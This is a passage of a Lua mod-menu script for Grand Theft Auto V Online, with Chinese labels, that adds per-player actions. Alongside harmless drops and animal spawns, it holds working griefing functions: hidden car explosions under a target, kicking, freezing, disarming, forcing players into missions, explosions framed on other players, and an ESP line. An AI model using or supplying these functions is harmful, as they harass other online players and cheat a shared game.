	toggleloop(drops, "掉落零食", {"dropsnacks"}, "", function(toggle)
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(pqs)
		while not STREAMING.HAS_MODEL_LOADED(pqs) do
			STREAMING.REQUEST_MODEL(pqs)
			util.yield()
		end
		OBJECT.CREATE_AMBIENT_PICKUP(pqspickup, pos.x, pos.y, pos.z, 0, false, pqs, true, false) --spawn snacks
		if not STREAMING.HAS_MODEL_LOADED(pqs) then
			util.toast("无法加载模型!")
		end
	end)

	toggleloop(drops, "掉落护甲", {"droparmor"}, "", function(toggle)
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(armor)
		while not STREAMING.HAS_MODEL_LOADED(armor) do
			STREAMING.REQUEST_MODEL(armor)
			util.yield()
		end
		OBJECT.CREATE_AMBIENT_PICKUP(armorpickup, pos.x, pos.y, pos.z, 0, false, armor, true, false) --spawn armor
		if not STREAMING.HAS_MODEL_LOADED(armor) then
			util.toast("Couldn't load the model")
		end
	end)

	toggleloop(drops, "掉落伞包", {"dropparachute"}, "", function(toggle)
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(parachute)
		while not STREAMING.HAS_MODEL_LOADED(parachute) do
			STREAMING.REQUEST_MODEL(parachute)
			util.yield()
		end
		OBJECT.CREATE_AMBIENT_PICKUP(parachutepickup, pos.x, pos.y, pos.z, 0, false, parachute, true, false) --spawn parachute
		if not STREAMING.HAS_MODEL_LOADED(parachute) then
			util.toast("无法加载模型!")
		end
	end)

	toggle(friendly, "观看玩家", {}, "", function(toggle)
		menu.trigger_commands("spectate " .. players.get_name(pid))
	end)

	action(friendly, "给予所有收藏品", {}, "17w RP\n1 -> 25", function()
		menu.trigger_commands("givecollectibles" .. players.get_name(pid))
		util.toast("完成 :)")
	end)

	action(friendly, "给予全部人所有收藏品", {}, "17w RP\n1 -> 25", function()
		menu.trigger_commands("givecollectiblesall")
		util.toast("完成 :)")
	end)

	action(friendly, "隐藏破坏 (精神状态会增加)", {}, "", function()
		menu.trigger_commands("spectate " .. players.get_name(pid) .. " on")
		util.yield(500)
		local fcartable = {}

		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		local defz = c.z
		STREAMING.REQUEST_MODEL(expcar)
		while not STREAMING.HAS_MODEL_LOADED(expcar) do
			STREAMING.REQUEST_MODEL(expcar)
			util.yield()
		end
		STREAMING.REQUEST_MODEL(floorbr)
		while not STREAMING.HAS_MODEL_LOADED(floorbr) do
			STREAMING.REQUEST_MODEL(floorbr)
			util.yield()
		end
		local success, floorcoords
		repeat
			success, floorcoords = util.get_ground_z(c.x, c.y)
			util.yield()
		until success
		floorcoords = floorcoords - 100
		c.z = floorcoords
		local floorrigp = entities.create_object(floorbr, c)
		c.z = defz
		c.z = c.z - 95 
		for i = 1, 24 do
			fcartable[#fcartable + 1] = entities.create_vehicle(expcar, c, 0) --spawn cars
		end
		util.yield(1000)
		FIRE.ADD_OWNED_EXPLOSION(p, c.x, c.y, floorcoords, exp, 100.0, true, false, 1.0) --explode cars
		util.yield(500)
		entities.delete_by_handle(floorrigp)
		util.yield(1000)
		
		for i = 1, #fcartable do
			entities.delete_by_handle(fcartable[i])
			fcartable[i] = nil
		end
		util.yield(500)
		menu.trigger_commands("spectate " .. players.get_name(pid) .. " off")
		util.toast("Done :)")
	end)

	toggleloop(friendly, "循环隐藏破坏 (精神状态会增加)", {}, "", function(toggle)
		local fcartable = {}

		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		local defz = c.z
		STREAMING.REQUEST_MODEL(expcar)
		while not STREAMING.HAS_MODEL_LOADED(expcar) do
			STREAMING.REQUEST_MODEL(expcar)
			util.yield()
		end
		STREAMING.REQUEST_MODEL(floorbr)
		while not STREAMING.HAS_MODEL_LOADED(floorbr) do
			STREAMING.REQUEST_MODEL(floorbr)
			util.yield()
		end
		local success, floorcoords
		repeat
			success, floorcoords = util.get_ground_z(c.x, c.y)
			util.yield()
		until success
		floorcoords = floorcoords - 100
		c.z = floorcoords
		local floorrigp = entities.create_object(floorbr, c)
		c.z = defz
		c.z = c.z - 95 
		for i = 1, 24 do
			fcartable[#fcartable + 1] = entities.create_vehicle(expcar, c, 0) --spawn cars
		end
		util.yield(1000)
		FIRE.ADD_OWNED_EXPLOSION(p, c.x, c.y, floorcoords, exp, 100.0, true, false, 1.0) --explode cars
		util.yield(500)
		entities.delete_by_handle(floorrigp)
		util.yield(1000)
		
		for i = 1, #fcartable do
			entities.delete_by_handle(fcartable[i])
			fcartable[i] = nil
		end
		util.yield()
		util.toast("Completed once :)")
		util.yield(1000)
	end)

	toggleloop(friendly, "自动传送到检查点", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		if PED.IS_PED_IN_ANY_VEHICLE(p) then
			local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
			RequestControl(veh)
			local dblip = HUD.GET_NEXT_BLIP_INFO_ID(431)
			local cdblip = HUD.GET_BLIP_COORDS(dblip)
			ENTITY.SET_ENTITY_COORDS(veh, cdblip.x, cdblip.y, cdblip.z, false, false, false, false)
			util.yield(1500)
		else
			util.toast(players.get_name(pid).. " 他必须是在车内")
		end
	end)

	action(friendly, "无敌载具", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		if PED.IS_PED_IN_ANY_VEHICLE(p) then
			local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
			RequestControl(veh)
			ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
		else
			util.toast(players.get_name(pid).. " 不在车内")
		end
	end)


	local pclpid = {}
	local pbmonke = {}
	local pwmonke = {}
	local pschop = {}
	local psoldchop = {}
	local psshark = {}
	local psshark2 = {}
	local pswhale = {}
	local pinputm = {}

	local pinput_model

	text(spawner, "输入字符", {"loadstringpid"}, "设置一个NPC比如'a_c_chop'", function(input)
		pinput_model = util.joaat(input)
	end, "")
	
	action(spawner, "自定义生成", {}, "", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		STREAMING.REQUEST_MODEL(pinput_model)
		while not STREAMING.HAS_MODEL_LOADED(pinput_model) do
			STREAMING.REQUEST_MODEL(pinput_model)
			util.yield()
		end
		pinputm [#pinputm + 1] = entities.create_ped(26, pinput_model, c, 0) --spawn string
		if not STREAMING.HAS_MODEL_LOADED(pinput_model) then
			util.toast("无法加载模型!")
		end
	end)

	action(spawner, "清除", {}, "", function()
		for i = 1, #pclpid do
			entities.delete_by_handle(pclpid[i])
			pclpid[i] = nil
		end

		for i = 1, #pbmonke do
			entities.delete_by_handle(pbmonke[i])
			pbmonke[i] = nil
		end

		for i = 1, #pwmonke do
			entities.delete_by_handle(pwmonke[i])
			pwmonke[i] = nil
		end

		for i = 1, #pschop do
			entities.delete_by_handle(pschop[i])
			pschop[i] = nil
		end

		for i = 1, #psoldchop do
			entities.delete_by_handle(psoldchop[i])
			psoldchop[i] = nil
		end

		for i = 1, #psshark do
			entities.delete_by_handle(psshark[i])
			psshark[i] = nil
		end

		for i = 1, #psshark2 do
			entities.delete_by_handle(psshark2[i])
			psshark2[i] = nil
		end

		for i = 1, #pswhale do
			entities.delete_by_handle(pswhale[i])
			pswhale[i] = nil
		end

		for i = 1, #pinputm do
			entities.delete_by_handle(pinputm[i])
			pinputm[i] = nil
		end
	end)

	action(psaved, "克隆", {}, "生成克隆的玩家", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(p)
		local pclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0) --spawns clone
		pclpid [#pclpid + 1] = pclone 
		PED.CLONE_PED_TO_TARGET(p, pclone)
	end)

	action(psaved, "黑色猴子", {}, "生成黑色猴子", function()
		local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		STREAMING.REQUEST_MODEL(BlackMonke)
		while not STREAMING.HAS_MODEL_LOADED(BlackMonke) do
			STREAMING.REQUEST_MODEL(BlackMonke)
			util.yield(10)
		end
		pbmonke [#pbmonke + 1] = entities.create_ped(26, BlackMonke, c, 0) --spawns black monkey
		if not STREAMING.HAS_MODEL_LOADED(BlackMonke) then
			util.toast("无法加载模型!")
		end
	end)

	action(psaved, "白色猴子", {}, "生成白色猴子", function()
		local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		STREAMING.REQUEST_MODEL(WhiteMonke)
		while not STREAMING.HAS_MODEL_LOADED(WhiteMonke) do
			STREAMING.REQUEST_MODEL(WhiteMonke)
			util.yield(10)
		end
		pwmonke [#pwmonke + 1] = entities.create_ped(26, WhiteMonke, c, 0) --spawns white monkey
		if not STREAMING.HAS_MODEL_LOADED(WhiteMonke) then
			util.toast("无法加载模型!")
		end
	end)

	action(psaved, "小查", {}, "生成宠物小查", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user_ped())
		local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		STREAMING.REQUEST_MODEL(chop)
		while not STREAMING.HAS_MODEL_LOADED(chop) do
			STREAMING.REQUEST_MODEL(chop)
			util.yield(10)
		end
		pschop [#pschop + 1] = entities.create_ped(26, chop, c, 0) --spawns chop
		if not STREAMING.HAS_MODEL_LOADED(chop) then
			util.toast("无法加载模型!")
		end
	end)

	action(psaved, "小查2", {}, "生成宠物小查", function()
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		STREAMING.REQUEST_MODEL(oldchop)
		while not STREAMING.HAS_MODEL_LOADED(oldchop) do
			STREAMING.REQUEST_MODEL(oldchop)
			util.yield(10)
		end
		psoldchop [#psoldchop + 1] = entities.create_ped(26, oldchop, c, 0) --spawns chop
		if not STREAMING.HAS_MODEL_LOADED(oldchop) then
			util.toast("无法加载模型!")
		end
	end)

	action(psaved, "鲨鱼", {}, "生成鲨鱼", function()
		local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		STREAMING.REQUEST_MODEL(shark)
		while not STREAMING.HAS_MODEL_LOADED(shark) do
			STREAMING.REQUEST_MODEL(shark)
			util.yield(10)
		end
		psshark [#psshark + 1] = entities.create_ped(26, shark, c, 0) --spawns a shark
		if not STREAMING.HAS_MODEL_LOADED(shark) then
			util.toast("无法加载模型!")
		end
	end)

	action(psaved, "锤头鲨鱼", {}, "生成锤头鲨鱼", function()
		local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		STREAMING.REQUEST_MODEL(shark2)
		while not STREAMING.HAS_MODEL_LOADED(shark2) do
			STREAMING.REQUEST_MODEL(shark2)
			util.yield(10)
		end
		psshark2 [#psshark2 + 1] = entities.create_ped(26, shark2, c, 0) --spawns a shark2
		if not STREAMING.HAS_MODEL_LOADED(shark2) then
			util.toast("无法加载模型!")
		end
	end)

	action(psaved, "鲸鱼", {}, "生成鲸鱼", function()
		local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		STREAMING.REQUEST_MODEL(whale)
		while not STREAMING.HAS_MODEL_LOADED(whale) do
			STREAMING.REQUEST_MODEL(whale)
			util.yield(10)
		end
		pswhale [#pswhale + 1] = entities.create_ped(26, whale, c, 0) --spawns a whale
		if not STREAMING.HAS_MODEL_LOADED(whale) then
			util.toast("无法加载模型!")
		end
	end)


	action(shortcutslist, "踢出", {}, "踢出玩家", function()
		menu.trigger_commands("kick".. players.get_name(pid))
	end)

	action(shortcutslist, "传送", {}, "传送到玩家", function()
		menu.trigger_commands("tp".. players.get_name(pid))
	end)

	action(shortcutslist, "传送到载具", {}, "传送到玩家载具里", function()
		menu.trigger_commands("tpveh".. players.get_name(pid))
	end)


	action(shortcutslist, "传送到我", {}, "传送玩家到我", function()
		menu.trigger_commands("summon".. players.get_name(pid))
	end)

	action(shortcutslist, "踢出载具", {}, "从载具里踢出玩家", function()
		menu.trigger_commands("vehkick".. players.get_name(pid))
	end)

	action(shortcutslist, "移除武器", {}, "移除玩家武器", function()
		menu.trigger_commands("disarm".. players.get_name(pid) .."on")
		util.yield(10)
		menu.trigger_commands("disarm".. players.get_name(pid) .."off")
	end)

	toggle(shortcutslist, "冻结", {}, "冻结玩家", function(toggle)
		menu.trigger_commands("freeze".. players.get_name(pid), toggle)
	end)

	toggle(shortcutslist, "强制镜头向前", {}, "强制镜头向前", function(toggle)
		menu.trigger_commands("confuse".. players.get_name(pid), toggle)
	end)

	action(shortcutslist, "强制进入自由模式任务", {}, "强制玩家进入自由模式任务", function()
		menu.trigger_commands("mission".. players.get_name(pid))
	end)


	toggleloop(explodeall, "循环栽赃所有人(包括自己)", {}, "", function(toggle)
		menu.trigger_commands("as " .. players.get_name(pid) .. " explode all")
		util.yield(300)
		menu.trigger_commands("as " .. players.get_name(pid) .. " explode candycub")
		util.yield(1000)
	end)

	toggleloop(explodeall, "循环栽赃自己", {}, "", function(toggle)
		menu.trigger_commands("as " .. players.get_name(pid) .. " explode candycub")
		util.yield(1000)
	end)


	toggleloop(miscplayer, "透视线", {}, "连接该玩家", function(toggle)
		local c = ENTITY.GET_ENTITY_COORDS(players.user_ped()) --get local player's pos
		local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local j = ENTITY.GET_ENTITY_COORDS(p) --get player's pos
		GRAPHICS.DRAW_LINE(c.x, c.y, c.z, j.x, j.y, j.z, 255, 255, 255, 255) --draw esp
	end)
end
    
local InitialPlayersList = players.list(true, true, true)
for i=1, #InitialPlayersList do
	GenerateFeatures(InitialPlayersList[i])
end
InitialPlayersList = nil

players.on_join(function(pid)
	while true do
		if joining then
			notification(PLAYER.GET_PLAYER_NAME(pid) .. " joined", colors.black)
		end
		util.yield()
	end
end)

players.dispatch_on_join()

local last_call_time = util.current_time_millis()
local redo_boost = false

util.create_thread(function()
	while true do
		if objectghosting then
			local PlayerPed = PLAYER.GET_PLAYER_PED(players.user())
			local PedVehicle = PED.GET_VEHICLE_PED_IS_USING(PlayerPed)
			if PED.IS_PED_IN_ANY_VEHICLE(PlayerPed) then
				local collision = entities.get_all_objects_as_handles()
				for i = 1, #collision do
					ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(collision[i], PedVehicle, false)
					ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(PedVehicle, collision[i], false)    -- unfortunately theres no way to force collision to reenable afaik so you just have to wait it out and travel to a new area which loads new objects
				end
			end
		end
	util.yield(500)
	end
end)
